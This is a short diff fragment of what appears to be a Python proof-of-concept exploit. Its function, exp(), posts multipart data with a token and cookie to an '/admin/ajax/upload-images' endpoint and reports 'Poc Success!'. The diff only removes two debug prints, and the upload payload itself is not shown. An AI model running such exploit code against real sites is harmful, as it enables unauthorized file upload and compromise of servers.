@@ -59,11 +59,11 @@ def exp(host, token, cookie_b):
            + '----------327107347321150223463725464476--\n'
 
     response = requests.post(host + '/admin/ajax/upload-images', headers=headers, data=data, cookies=cookies)
-    print('response_code:', response.status_code)
+    
     if response.status_code == 200:
         print("Poc Success!")
         
-    print('response:', response.text)
+    
 
 
 if __name__ == '__main__':
